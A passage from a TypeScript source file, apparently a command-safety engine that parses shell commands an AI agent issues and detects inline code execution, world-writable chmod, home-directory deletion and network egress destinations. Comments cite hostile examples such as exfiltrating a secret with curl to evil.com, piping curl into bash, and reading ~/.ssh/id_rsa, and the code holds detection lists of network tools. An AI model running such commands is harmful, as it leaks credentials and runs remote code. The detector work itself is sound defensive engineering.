      // so it simply doesn't match (no false positive on `chmod $MODE file`).
      for (let i = idx + 1; i < words.length; i++) {
        const w = words[i];
        if (w !== null && w.startsWith('-')) continue; // chmod option flag
        if (w !== null && CHMOD_OPEN_PERM_TOKENS.has(w.toLowerCase())) found = true;
        break;
      }
      return true;
    });
  } catch {
    return found; // partial result on walker error
  }
  return found;
}

/**
 * Does `toolName` carry a shell command? True for BASH_TOOL_NAMES spellings and
 * for any tool whose toolInspection field is `command` (e.g. `terminal.execute`).
 *
 * THE definition of "shell-shaped" — the gate, the CLI scan, and `explain` must
 * all use this one, or they disagree about which rules apply to which tool
 * (/code-review 2026-08-13: the gate reviewed `sudo …` on `shell` while scan
 * reported nothing, so the customer-facing report under-counted).
 */
export function isShellShapedTool(
  toolName: string,
  toolInspection?: Record<string, string>
): boolean {
  if (isBashTool(toolName)) return true;
  if (!toolInspection) return false;
  const pattern = Object.keys(toolInspection).find((p) => matchesPattern(toolName, p));
  return pattern !== undefined && toolInspection[pattern] === 'command';
}

/**
 * Does a smart rule's `tool` scope cover this tool? Adds the shell-shape alias:
 * the six default shell-safety rules and shield bundles are written
 * `tool:'bash'`, and an agent's choice of tool-name spelling (`shell`,
 * `run_shell_command`, `execute_bash`, `terminal.execute`) must not silently
 * void them. An absent rule scope matches everything (callers' prior semantics).
 */
export function toolMatchesRule(
  toolName: string,
  ruleTool: string | string[] | undefined,
  toolInspection?: Record<string, string>
): boolean {
  if (!ruleTool) return true;
  if (matchesPattern(toolName, ruleTool)) return true;
  return isShellShapedTool(toolName, toolInspection) && matchesPattern('bash', ruleTool);
}

// ── Inline-execution detection (the policy-bypass tunnel) ───────────────────
// `python3 -c "<code>"` hides the real action inside a program that
// command-level rules can't see. THREE spellings of the same tunnel:
//   1. code as an argument:  python3 -c / node -e / perl -pe
//   2. code via stdin:       python3 - <<'PY' / python3 < f / python3 <<< "code"
//   3. code via a pipe:      echo "code" | python3   (bare interpreter, no script)
//
// AST-BASED (/code-review 2026-08-13). The previous regex/hand-split version
// produced three separate defects in one commit: `bash -euo pipefail script.sh`
// false-positived (it tested only that a flag STARTED with -c/-e), a
// backslash-escaped quote before a pipe hid the pipe entirely, and its
// hand-copied wrapper list was both incomplete (`env -u`, `xargs -I`) and a
// duplicate of COMMAND_WRAPPERS. Walking the real AST fixes all three by
// construction: flags are whole words, pipes/redirects are structure, and
// wrapper unwrapping reuses the one COMMAND_WRAPPERS set.
const INLINE_INTERPRETER =
  /^(python[\d.]*|perl|ruby|node|tsx|ts-node|php|lua|deno|bun|pwsh|powershell(?:\.exe)?|osascript|rscript|irb|bash|sh|zsh|script|su)$/i;

// Runner front-ends that exec an interpreter from their own argv
// (`uv run python -c …`, `npx tsx -e …`). Distinct from COMMAND_WRAPPERS: these
// take a subcommand before the real command, so the interpreter can sit deeper.
const RUNNER_WRAPPERS = new Set([
  'uv',
  'uvx',
  'poetry',
  'pipenv',
  'pdm',
  'rye',
  'hatch',
  'conda',
  'mamba',
  'micromamba',
  'npx',
  'pnpm',
  'yarn',
  'bunx',
  'watch',
  'strace',
  'ltrace',
  'chroot',
  'unshare',
  'runuser',
]);

/**
 * True when `w` is the interpreter's CODE flag (vs an ordinary option).
 * Per-interpreter letters — this is what separates `bash -c CODE` (code) from
 * `bash -euo pipefail` (options) and `perl -e CODE` (code) from `perl -cw`
 * (syntax check). Bundles count (`bash -xc`, `python3 -uc`, `perl -pe`).
 */
function isInlineCodeFlag(interp: string, w: string): boolean {
  const lw = w.toLowerCase();
  if (lw === '--eval' || lw === '--command' || lw === '--print') return true;
  if (/^(pwsh|powershell)/.test(interp)) return /^-(c|command|e|ec|enc|encodedcommand)$/i.test(lw);
  if (!w.startsWith('-') || w.startsWith('--')) return false;

  // Which single letter means "the next thing is CODE", per interpreter.
  const codeLetters = /^(perl|ruby|lua|bun|osascript|rscript|irb)$/.test(interp)
    ? 'e'
    : /^(node|tsx|ts-node)$/.test(interp)
      ? 'ep'
      : interp === 'php'
        ? 'r'
        : 'c'; // python*, bash, sh, zsh

  // Option BUNDLE only — everything up to an attached VALUE. Single-letter
  // options cluster (`bash -xc`, `python3 -uc`, `perl -pe`), but several
  // interpreters also take a value attached to the flag: `perl -MData::Dumper`,
  // `ruby -rbundler/setup`, `ruby -Ilib`, `python3 -Werror::Deprecation`,
  // `node -rts-node/register`. Testing `.includes(letter)` over the WHOLE token
  // read those VALUES as option letters — `-MData::Dumper` contains an 'e' from
  // "Dumper" — and turned six ordinary script runs into approval prompts
  // (/code-review round 3). The bundle therefore stops at the first
  // value-taking option letter, and only pure a-z0-9 clusters are scanned.
  const body = lw.slice(1);
  // Cut at the first value-taking option letter OR the first non-alphanumeric
  // character (quote, slash, colon — where an attached value always begins).
  // Cutting at BOTH matters: `perl -pe's/x/y/'` must still read as the bundle
  // `pe` (code), while `perl -MData::Dumper` must read as the empty bundle.
  const cutAt = /^(perl|ruby|node|tsx|ts-node)$/.test(interp) ? /[mirw]|[^a-z0-9]/ : /[^a-z0-9]/;
  const cut = body.search(cutAt);
  const bundle = cut >= 0 ? body.slice(0, cut) : body;
  return [...codeLetters].some((l) => bundle.includes(l));
}

// Redirect operators that feed a command's STDIN — the heredoc/herestring/file
// forms of the same tunnel. Derived from samples (like REDIR_HEREDOC_OPS) so a
// library version bump can't silently break them.
let _redirStdinOps: Set<number> | null = null;
function redirStdinOps(): Set<number> {
  if (_redirStdinOps) return _redirStdinOps;
  _redirStdinOps = new Set<number>(
    [
      deriveRedirOp('cat <<X\nX'),
      deriveRedirOp('cat <<-X\nX'),
      deriveRedirOp('cat < f'),
      deriveRedirOp('cat <<< x'),
    ].filter((op) => op >= 0)
  );
  return _redirStdinOps;
}

// `&&` / `||` operator codes — a BinaryCmd carrying either is a LIST, not a
// pipeline, so its RHS does not read the LHS's stdout. Derived once from
// samples for the same version-robustness reason; on failure the set stays
// empty and every BinaryCmd RHS is treated as pipe-fed (fails toward review).
function deriveBinaryOp(sample: string): number {
  try {
    const f = sharedParser.Parse(sample, 'cmd');
    let op = -1;
    syntax.Walk(f, (node: unknown) => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (n && syntax.NodeType(n) === 'BinaryCmd' && op < 0) op = n.Op;
      return true;
    });
    return op;
  } catch {
    return -1;
  }
}
let _listOps: Set<number> | null = null;
function listOps(): Set<number> {
  if (_listOps) return _listOps;
  _listOps = new Set<number>(
    [deriveBinaryOp('a && b'), deriveBinaryOp('a || b')].filter((o) => o >= 0)
  );
  return _listOps;
}

// Wrappers whose first BARE operand is a target, with the real command after it
// (`chroot /mnt python3 -c …`). Consumed exactly ONCE per wrapper — consuming
// every bare operand would swallow the interpreter itself. `runuser -u app …`
// and `unshare -n …` take their target via a FLAG, so the flag path already
// handles them and they must NOT be listed here. `su` is not a wrapper at all:
// its `-c` takes a command string, so it is an INLINE_INTERPRETER instead.
const WRAPPER_TAKES_TARGET = new Set(['chroot']);

// Interpreters whose LEADING bare operand names a target rather than a program
// (`su USER -c CODE`). Their real code flag follows that operand.
const INTERP_LEADING_TARGET = new Set(['su']);

/** Strip leading wrappers/runners from a resolved arg list, returning the index
 *  of the real command head. Handles `sudo -u www python3`, `env -u FOO python3`,
 *  `timeout 5 python3`, `uv run python`, `conda run -n env python`,
 *  `chroot /mnt python3`. */
function unwrapCommandHead(words: (string | null)[]): number {
  let i = 0;
  while (i < words.length) {
    const head = (words[i] ?? '').toLowerCase().split('/').pop() ?? '';
    // `find … -exec CMD …` / `-execdir` run CMD per match — the real command
    // head sits after the flag, and mvdan parses it as ordinary find operands.
    if (head === 'find') {
      const x = words.findIndex(
        (w, k) => k > i && (w === '-exec' || w === '-execdir' || w === '-ok')
      );
      if (x < 0) break;
      i = x + 1;
      continue;
    }
    if (!COMMAND_WRAPPERS.has(head) && !RUNNER_WRAPPERS.has(head)) break;
    i++;
    let targetConsumed = false;
    // Skip this wrapper's own flags and their operands. A flag's operand is
    // unknowable per-flag across every wrapper, so consume a following non-flag
    // token only for the runner `run`/`exec` subcommand forms and for numeric
    // operands (timeout 5, nice 10). Everything else stops the skip, which is
    // the SAFE direction: we stop on the interpreter, never past it.
    while (i < words.length) {
      const t = words[i];
      if (t === null) {
        i++;
        continue;
      } // dynamic token — keep scanning
      const lt = t.toLowerCase();
      // `env FOO=1 python3 -c` — an assignment given as a WRAPPER ARG (mvdan
      // only puts assignments in cmd.Assigns when they lead the command, so
      // these arrive as ordinary args and would otherwise stop the peel).
      if (/^[A-Za-z_]\w*=/.test(t)) {
        i++;
        continue;
      }
      if (t.startsWith('-')) {
        i++;
        // `-u FOO`, `-n 5`, `-I {}`, `-c base`: if the NEXT token is not itself a
        // flag and not a plausible command, treat it as this flag's operand.
        const nxt = words[i];
        if (
          nxt != null &&
          !nxt.startsWith('-') &&
          !INLINE_INTERPRETER.test(nxt.split('/').pop() ?? '') &&
          !COMMAND_WRAPPERS.has(nxt.toLowerCase()) &&
          !RUNNER_WRAPPERS.has(nxt.toLowerCase())
        )
          i++;
        continue;
      }
      // Runner subcommands and numeric operands are consumed; anything else is
      // the command head.
      if (lt === 'run' || lt === 'exec' || lt === 'dlx' || /^\d+(\.\d+)?[smhd]?$/.test(lt)) {
        i++;
        continue;
      }
      // A target operand (`chroot /mnt CMD`) — consumed exactly ONCE, then the
      // next bare token is the real command head. Without the one-shot guard
      // this swallows the interpreter too.
      if (!targetConsumed && WRAPPER_TAKES_TARGET.has(head)) {
        targetConsumed = true;
        i++;
        continue;
      }
      break;
    }
  }
  return i;
}

/**
 * Does this ONE statement execute inline code? `pipeFed` says whether it reads
 * another command's stdout (decided by the caller at the pipeline node).
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function inlineExecStmt(stmt: any, pipeFed: boolean): boolean {
  const cmd = stmt?.Cmd;
  if (!cmd || syntax.NodeType(cmd) !== 'CallExpr') return false;

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const words: (string | null)[] = (cmd.Args || []).map((a: any) => resolveWordLiteral(a));
  if (words.length === 0) return false;

  const headIdx = unwrapCommandHead(words);
  const rawHead = words[headIdx];
  if (rawHead == null) return false;
  const interp = (rawHead.split('/').pop() ?? '').toLowerCase();
  if (!INLINE_INTERPRETER.test(interp)) return false;

  let args = words.slice(headIdx + 1);
  // `deno eval "code"` spells the code form as a subcommand.
  if (interp === 'deno' && (args[0] ?? '').toLowerCase() === 'eval') return true;

  // `su USER -c CODE` — the leading bare operand is a TARGET (a user), not a
  // program, so it must not trip the "a program was selected" rule below (which
  // otherwise stops the code-flag scan before ever reaching `-c`).
  if (INTERP_LEADING_TARGET.has(interp)) {
    const firstFlag = args.findIndex((a) => a == null || a.startsWith('-'));
    args = firstFlag >= 0 ? args.slice(firstFlag) : [];
  }

  let positionals = 0;
  let selectedProgram = false; // a script operand or `-m module` was chosen
  for (const a of args) {
    if (a == null) {
      positionals++; // dynamic arg — treat as a script operand
      selectedProgram = true;
      continue;
    }
    // Once a SCRIPT has been selected, later flags belong to that script, not
    // to the interpreter: `python3 manage.py runserver -c settings.cfg` is a
    // Django option, not `python3 -c CODE` (/code-review round 3 — this scan
    // used to keep matching code flags past the script and flagged every
    // `node scripts/build.js -p production`).
    if (!selectedProgram && isInlineCodeFlag(interp, a)) return true;
    // `-m module` selects a program too, so a trailing `-` after it is that
    // module's stdin DATA (`python3 -m black -`), not the interpreter reading code.
    if (a === '-m') {
      selectedProgram = true;
      continue;
    }
    if (a === '-' && !selectedProgram) return true; // bare interpreter reading code from stdin
    if (!a.startsWith('-')) {
      positionals++;
      selectedProgram = true;
    }
  }

  // No script operand + code arriving over stdin (heredoc, herestring,
  // `< file`) or a pipe → the interpreter executes whatever it is fed.
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const redirs: any[] = stmt.Redirs || cmd.Redirs || [];
  const stdinFed = redirs.some((r) => r && redirStdinOps().has(r.Op));
  if (positionals === 0 && (stdinFed || pipeFed)) {
    // Shells are excluded from the IMPLICIT forms: `curl … | bash` belongs to
    // the eval-remote / pipe-to-shell family (Class A tiers that own it, and
    // flagging it here would DOWNGRADE their block to a review), and
    // `bash <<'EOF'` is the everyday multi-command idiom.
    if (!/^(bash|sh|zsh)$/i.test(interp)) return true;
  }
  return false;
}

/**
 * AST-aware inline-execution detector. Returns true when the command runs code
 * supplied on the command line, via stdin, or via a pipe into a bare
 * interpreter. Structural, so it is not fooled by quoting, escapes, option
 * bundles, or wrapper nesting. Pure.
 */
export function detectInlineExec(command: string): boolean {
  const f = parseShared(command);
  if (f === PARSE_FAIL) {
    // Conservative fallback: the plain `interp -c CODE` form, anchored per
    // simple-command. A command mvdan cannot parse is unlikely to run, but this
    // detector gates a bypass tunnel — degrade to the old narrow check, never
    // to silence.
    return /(^|[|;&]|&&)\s*(?:[\w./-]*\/)?(python[\d.]*|perl|ruby|node|php|lua|deno|bun|pwsh|osascript|rscript|bash|sh|zsh)\s+-{1,2}[a-z]*[ceEr]/i.test(
      command
    );
  }

  let found = false;
  try {
    syntax.Walk(f, (node: unknown) => {
      if (!node || found) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      const t = syntax.NodeType(n);
      // A pipeline's RHS reads the LHS's stdout. It must be judged HERE, at the
      // BinaryCmd, and not via a set of "pipe-fed statements": the mvdan JS
      // binding hands out a NEW wrapper object on every property access, so
      // `n.Y` is never identity-equal to the Stmt the walker later visits
      // (verified: `Y === Y` is false). `&&`/`||` are BinaryCmds too — only a
      // non-list operator is a pipe.
      if (t === 'BinaryCmd' && n.Y && !listOps().has(n.Op)) {
        if (inlineExecStmt(n.Y, true)) {
          found = true;
          return false;
        }
      }
      if (t === 'Stmt' && inlineExecStmt(n, false)) {
        found = true;
        return false;
      }
      return true;
    });
  } catch {
    return found; // partial result on walker error
  }
  return found;
}

/**
 * AST-aware chmod-777 detector. Fires when `chmod` runs (directly or via a
 * command wrapper like sudo/xargs/env) with a world-WRITABLE mode
 * (777/0777/a+rwx) — see chmodHasOpenPermMode. `+x` (execute-only) is excluded:
 * it is not world-writable. This is the structural replacement for the
 * FP-prone `shield:filesystem:review-chmod-777` regex rule, which matched
 * `chmod 777` anywhere in the raw string — so a `node -e` / `python -c` payload
 * whose string/regex literal merely MENTIONS `chmod 777` (a detection pattern)
 * tripped it even though no chmod runs. Returns a 'review' verdict (world-open
 * perms are human-approval-worthy but not auto-block) or null. Pure.
 */
export function analyzeChmod777(
  command: string
): { ruleName: string; verdict: 'review'; reason: string; description: string } | null {
  // Cheap pre-check before parsing — most commands have no chmod at all. Strip
  // quote/escape obfuscation first (`c\hmod`, `c''hmod`) so the fast-path-out
  // doesn't bail before the AST resolves it; the real gate is the mode walk.
  if (!/chmod/i.test(command.replace(/[\\'"]/g, ''))) return null;
  if (!chmodHasOpenPermMode(command)) return null;
  return {
    ruleName: 'shield:filesystem:review-chmod-777',
    verdict: 'review',
    reason: 'chmod 777 requires human approval (filesystem shield)',
    description:
      'The AI wants to make a file world-writable/executable (chmod 777). This removes the permission protection on the file so any user or process can modify or run it.',
  };
}

/**
 * True when `path` is under $HOME (~ or absolute /home/* or /root) AND not in
 * the tool-managed cache allow-list. Used to gate `rm -rf` on home paths.
 */
export function isProtectedHomePath(rawPath: string): boolean {
  // Normalize: strip leading $HOME / ~. Reject if not under home at all.
  let p = rawPath.replace(/^\$HOME[\\/]?|^\$\{HOME\}[\\/]?/, '~/');
  // Match ~, ~/, ~/anything (but not "~name" — that's a different user's home,
  // which is still sensitive).
  let underHome = false;
  if (p === '~' || p.startsWith('~/') || p.startsWith('~\\')) {
    p = p.replace(/^~[\\/]?/, '');
    underHome = true;
  } else if (/^\/home\/[^/]+/.test(p) || /^\/root(\/|$)/.test(p)) {
    // Strip /home/<user>/ or /root/ prefix to compare against the cache list.
    p = p.replace(/^\/home\/[^/]+[\\/]?|^\/root[\\/]?/, '');
    underHome = true;
  }
  if (!underHome) return false;

  // The bare home root itself is always protected.
  if (p === '' || p === '.' || p === './') return true;

  // Allow tool-managed caches.
  for (const safe of HOME_CACHE_ALLOWLIST) {
    if (p === safe || p.startsWith(safe + '/') || p.startsWith(safe + '\\')) {
      return false;
    }
  }
  return true;
}

/** How completely a word resolved to text we can reason about. */
export type WordResolution = 'literal' | 'partial';

export interface ResolvedWord {
  /** Path text, with each unresolvable part replaced by PATH_SEGMENT_SENTINEL. */
  value: string;
  /** 'partial' when at least one part was dynamic. */
  resolution: WordResolution;
}

/**
 * Resolve one shell word to text, substituting a sentinel for the parts we
 * cannot know.
 *
 * This used to return `null` for the WHOLE word as soon as any part was
 * dynamic, and the caller then skipped it — so `cat $HOME/.ssh/id_rsa` reached
 * the sensitive-path matcher with no path at all and was ALLOWED, while
 * `cat ~/.ssh/id_rsa`, the same file, blocked. A `null` meaning "I could not
 * resolve this" was being read as "there is nothing here".
 *
 * `$HOME` / `${HOME}` resolve to `~` rather than to the sentinel. That is not a
 * lookup table waiting to grow: HOME is the one variable whose value this
 * engine already claims to know — isProtectedHomePath handles `$HOME`,
 * `${HOME}` and `~` and returns the same answer for all three. It has simply
 * never been reachable, because the extractor discarded the argument first.
 *
 * The neighbouring extractNetworkTargets already documents this exact stance
 * ("the host is literal even when the body is not"); this brings the two into
 * line.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function resolveWordParts(w: any): ResolvedWord {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const parts: any[] = w?.Parts || [];
  let s = '';
  let partial = false;
  const dynamic = (): void => {
    s += PATH_SEGMENT_SENTINEL;
    partial = true;
  };
  for (const p of parts) {
    const t = syntax.NodeType(p);
    if (t === 'Lit') s += (p.Value ?? '').replace(/\\(.)/g, '$1');
    else if (t === 'SglQuoted') s += p.Value ?? '';
    else if (t === 'DblQuoted') {
      // Resolve the literal INNER parts and sentinel the rest, rather than
      // discarding the whole quoted run — `"$HOME/.ssh/id_rsa"` is the same
      // file as its unquoted twin.
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      for (const ip of (p.Parts || []) as any[]) {
        if (syntax.NodeType(ip) === 'Lit') s += (ip as { Value?: string }).Value ?? '';
        else if (syntax.NodeType(ip) === 'ParamExp' && paramName(ip) === 'HOME') s += '~';
        else dynamic();
      }
    } else if (t === 'ParamExp' && paramName(p) === 'HOME') s += '~';
    else dynamic();
  }
  return { value: s, resolution: partial ? 'partial' : 'literal' };
}

/** The variable name of a ParamExp, or '' when the shape is unexpected. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function paramName(p: any): string {
  return typeof p?.Param?.Value === 'string' ? p.Param.Value : '';
}

export interface ExtractedArgs {
  name: string;
  flags: string[];
  paths: string[];
  /**
   * True when any word did not resolve fully.
   *
   * The rm-cleanup waiver used to derive this by COUNTING how many arguments
   * the extractor had silently dropped. That signal disappears the moment
   * words stop being dropped, so it is stated here instead of inferred — and
   * it is strictly stronger than the count, which could be satisfied by a word
   * that still produced one path (`rm -f out$N.log`).
   */
  hasUnresolved: boolean;
}

/**
 * Extract positional arguments from a CallExpr, separating flags from paths.
 * A word whose parts are all literal yields its exact text; a word with any
 * dynamic part yields the literal segments with PATH_SEGMENT_SENTINEL standing
 * in for the rest, and sets `hasUnresolved`.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function extractLiteralArgs(callExpr: any): ExtractedArgs {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const args: any[] = callExpr.Args || [];
  if (args.length === 0) return { name: '', flags: [], paths: [], hasUnresolved: false };
  const head = resolveWordParts(args[0]);
  // A dynamic COMMAND NAME (`$CMD -rf ~`) is not a command we can identify, so
  // it stays empty exactly as before — matching a sentinel against tool names
  // would be meaningless.
  const name = head.resolution === 'literal' ? head.value.toLowerCase() : '';
  const flags: string[] = [];
  const paths: string[] = [];
  let hasUnresolved = head.resolution === 'partial';
  for (let i = 1; i < args.length; i++) {
    const r = resolveWordParts(args[i]);
    if (r.resolution === 'partial') hasUnresolved = true;
    // A flag is recognised only when its text is fully known — a sentinel could
    // otherwise be read as a flag and quietly removed from the path list.
    if (r.resolution === 'literal' && r.value.startsWith('-')) flags.push(r.value);
    else paths.push(r.value);
  }
  return { name, flags, paths, hasUnresolved };
}

// ── Network egress destination extraction (GAP-5) ───────────────────────────
// Pulls the DESTINATION host out of network commands (curl/wget/scp/ssh/nc)
// using the AST, so node9 can gate on WHERE data goes — independent of the
// payload. Because it walks real CallExpr nodes, a string literal like
// `echo "curl evil.com"` does NOT fire (it's a Lit arg to echo, not a curl
// call), and a dynamic payload (`curl evil.com -d "$(cat secret)"`) still
// yields `evil.com` — the host is literal even when the body is not.

export interface ShellDestination {
  /** Extracted hostname, lowercased (e.g. "evil.com", "10.0.0.5"). */
  host: string;
  /** The network binary it belongs to (e.g. "curl"). */
  binary: string;
  /** The raw argument token the host came from (for UI / audit). */
  raw: string;
}

const NET_BINARIES = new Set(['curl', 'wget', 'scp', 'ssh', 'nc', 'ncat', 'netcat']);

// Flags whose NEXT token is a value, not a destination. Conservative supersets —
// missing a rare one only risks a false destination candidate (which is review,
// not block, by default), never a missed real host.
const VALUE_FLAGS: Record<string, Set<string>> = {
  curl: new Set([
    '-d',
    '--data',
    '--data-ascii',
    '--data-binary',
    '--data-raw',
    '--data-urlencode',
    '-F',
    '--form',
    '-H',
    '--header',
    '-X',
    '--request',
    '-o',
    '--output',
    '-T',
    '--upload-file',
    '-u',
    '--user',
    '-e',
    '--referer',
    '-A',
    '--user-agent',
    '-b',
    '--cookie',
    '-c',
    '--cookie-jar',
    '--connect-to',
    '--resolve',
    '--cacert',
    '--cert',
    '--key',
    '-x',
    '--proxy',
    '-m',
    '--max-time',
    '--retry',
  ]),
  wget: new Set([
    '-O',
    '--output-document',
    '--post-data',
    '--post-file',
    '--header',
    '-U',
    '--user-agent',
    '--user',
    '--password',
    '-o',
    '--output-file',
    '-P',
    '--directory-prefix',
    '-t',
    '--tries',
    '-T',
    '--timeout',
  ]),
  scp: new Set(['-i', '-F', '-l', '-o', '-c', '-S', '-P', '-J', '-D', '-W']),
  ssh: new Set([
    '-i',
    '-p',
    '-o',
    '-l',
    '-F',
    '-c',
    '-L',
    '-R',
    '-D',
    '-W',
    '-b',
    '-e',
    '-m',
    '-O',
    '-Q',
    '-S',
    '-J',
    '-w',
    '-B',
    '-I',
    '-E',
  ]),
  nc: new Set(['-p', '-s', '-w', '-X', '-x', '-e', '-g', '-G', '-i', '-O', '-T', '-q', '-m']),
};

// Resolve one Word node to its literal text, or null if it has any dynamic part
// (param/command/arithmetic expansion) — we must not treat dynamic content as a
// host, but a dynamic flag-VALUE must still consume its flag's skip slot.
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function resolveWordLiteral(w: any): string | null {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const parts: any[] = w?.Parts || [];
  let s = '';
  for (const p of parts) {
    const t = syntax.NodeType(p);
    if (t === 'Lit') s += (p.Value ?? '').replace(/\\(.)/g, '$1');
    else if (t === 'SglQuoted') s += p.Value ?? '';
    else if (t === 'DblQuoted') {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const inner: any[] = p.Parts || [];
      if (!inner.every((ip: unknown) => syntax.NodeType(ip) === 'Lit')) return null;
      s += inner.map((ip: { Value?: string }) => ip.Value ?? '').join('');
    } else {
      return null; // dynamic
    }
  }
  return s;
}

/**
 * Parse a destination host out of a single token. Handles scheme URLs
 * (`https://h/p`), scheme-less curl targets (`evil.com/p`), `user@host:path`
 * (scp/ssh), and `host:port`. Returns the lowercased hostname, or null if the
 * token doesn't resolve to a plausible host. IPv6 literals are out of scope v1.
 */
export function parseDestHost(token: string): string | null {
  if (!token) return null;
  let t = token.trim();
  if (!t || t.startsWith('-')) return null;
  // Scheme URL — let URL() do the work.
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(t)) {
    try {
      const h = new URL(t).hostname.toLowerCase();
      return h || null;
    } catch {
      return null;
    }
  }
  // Strip user@ (scp/ssh/curl creds), then path, then port/scp-colon.
  const at = t.lastIndexOf('@');
  if (at >= 0) t = t.slice(at + 1);
  t = t.split('/')[0]; // drop /path
  t = t.replace(/:\d+$/, ''); // drop :port
  t = t.split(':')[0]; // drop scp :path
  t = t.toLowerCase();
  // Cap at the max DNS name length (253). A longer string can't be a valid host
  // anyway, and the bound guards the dotted-host regex below from O(n^2)
  // backtracking on a crafted multi-KB literal token (e.g. `curl a.a.a.…`).
  // Applied here (post path/port strip) so long URL paths/queries — which were
  // already removed above — never cause a real destination to be dropped.
  if (t.length > 253) return null;
  // Plausible host: dotted domain or IPv4, or bare "localhost".
  if (t === 'localhost') return t;
  if (/^[a-z0-9.-]+\.[a-z0-9.-]+$/.test(t)) return t;
  return null;
}

// Per-binary destination extraction from an ordered, literal-resolved arg list
// (null entries = dynamic args). Returns raw destination tokens (host parsing
// happens in the caller so `raw` is preserved).
function destTokensForBinary(binary: string, args: (string | null)[]): string[] {
  const valueFlags = VALUE_FLAGS[binary] ?? new Set<string>();
  const positionals: string[] = [];
  const urlFlagValues: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const tok = args[i];
    if (tok === null) continue; // dynamic — can't be a host; flag-skip handled below
    if (tok.startsWith('-')) {
      // --url=VALUE / --url VALUE → the value IS the destination.
      if (tok.startsWith('--url=')) {
        urlFlagValues.push(tok.slice('--url='.length));
        continue;
      }
      if (tok === '--url') {
        const next = args[i + 1];
        if (typeof next === 'string') urlFlagValues.push(next);
        i++; // consume value (even if dynamic)
        continue;
      }
      if (tok.includes('=')) continue; // --flag=value boolean-ish; value not a host
      if (valueFlags.has(tok)) i++; // skip this flag's value token
      continue; // boolean flag
    }
    positionals.push(tok);
  }

  switch (binary) {
    case 'curl':
    case 'wget':
      // Any positional URL/host is a target; curl/wget can take several.
      return [...urlFlagValues, ...positionals];
    case 'ssh':
      // First positional is [user@]host; the rest is the remote command.
      return positionals.slice(0, 1);
    case 'scp':
      // Remote specs contain a ':' (host:path); local paths usually don't.
      return positionals.filter((p) => p.includes(':') || p.includes('@'));
    case 'nc':
    case 'ncat':
    case 'netcat':
      // First positional is the host (second is the port).
      return positionals.slice(0, 1);
    default:
      return [];
  }
}

/**
 * AST-extract every network destination host in a shell command. Walks each
 * CallExpr; for curl/wget/scp/ssh/nc it resolves the destination argument(s)
 * and parses the host. Deduplicated by host. Pure — no I/O, no DNS.
 */
export function extractShellDestinations(command: string): ShellDestination[] {
  const f = parseShared(command);
  if (f === PARSE_FAIL) return []; // fail open for FPs, not FNs
  const out: ShellDestination[] = [];
  const seen = new Set<string>();
  try {
    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const callArgs: any[] = n.Args || [];
      if (callArgs.length === 0) return true;
      const name = (resolveWordLiteral(callArgs[0]) || '').toLowerCase();
      if (!NET_BINARIES.has(name)) return true;
      const rest = callArgs.slice(1).map((a) => resolveWordLiteral(a));
      for (const raw of destTokensForBinary(name, rest)) {
        const host = parseDestHost(raw);
        if (!host) continue;
        const key = `${name}:${host}`;
        if (seen.has(key)) continue;
        seen.add(key);
        out.push({ host, binary: name, raw });
      }
      return true;
    });
  } catch {
    return out; // partial result on walker error — fail open
  }
  return out;
}

/**
 * AST-based filesystem-operation detector. Walks each CallExpr, identifies
 * dangerous patterns by *resolved path arguments*, returns the first verdict
 * encountered. Never matches dangerous strings that appear inside JSON args,
 * heredoc bodies, or unrelated path segments — the structural analysis means
 * a string only counts if it is the actual argument to the actual command.
 */
// Memoize analyzeFsOperation. The scanner calls this once per bash command
// and many commands repeat across sessions. Bounded LRU like the normalize
// cache. `null` results are cached too — that's the common case (no fs op).
const FS_OP_CACHE_MAX = 5_000;
const fsOpCache = new Map<string, FsOpVerdict | null>();

export function analyzeFsOperation(command: string): FsOpVerdict | null {
  // De-obfuscate command tokens first (r''m → rm, \rm → rm). Without this the
  // raw-string prescreen below — and the AST command-name match — are dodged by
  // trivial quote/escape tricks, since block-rm-rf-home is the AST's job (the
  // equivalent regex smart rule is suppressed for bash; see policy/index.ts).
  // normalizeCommandForPolicy is memoized + shares the AST cache, so this is
  // cheap, and using the normalized string as the cache key dedups raw variants.
  const normalized = normalizeCommandForPolicy(command);
  // Fast path — skip the AST parse when no fs-op tool keyword is present.
  // ⭐ TWO reasons to parse, because there are two ways to reach a file.
  //
  // The name prescreen alone made the Stmt/redirect branch dead code for any
  // command outside the reader set: `md5sum < ~/.ssh/id_rsa` bailed here and
  // never reached the AST. Measured — the redirect rows passed for `cat` and
  // `grep` (both readers) and failed for `md5sum` and `wc`, which is exactly
  // the half-applied widening this file was already bitten by once today, when
  // FS_OP_PRESCREEN_RE was a hand-written copy of FS_READ_TOOLS.
  //
  // `<(?!<)` is a single `<` — a file redirect. It excludes `<<` and `<<<`
  // (heredoc/herestring), whose Word is inline content rather than a path and
  // which the redirect branch ignores anyway, so the extra parses are bounded
  // to commands that genuinely redirect from a file.
  if (!FS_OP_PRESCREEN_RE.test(normalized) && !/<(?!<)/.test(normalized)) return null;
  if (fsOpCache.has(normalized)) {
    const hit = fsOpCache.get(normalized) ?? null;
    fsOpCache.delete(normalized);
    fsOpCache.set(normalized, hit);
    return hit;
  }
  const computed = analyzeFsOperationImpl(normalized);
  if (fsOpCache.size >= FS_OP_CACHE_MAX) {
    const oldest = fsOpCache.keys().next().value;
    if (oldest !== undefined) fsOpCache.delete(oldest);
  }
  fsOpCache.set(normalized, computed);
  return computed;
}

// ── rm same-command create-then-delete waiver ──────────────────────────────
//
// The founder's recurring rm FP is a write→run→cleanup loop in ONE command:
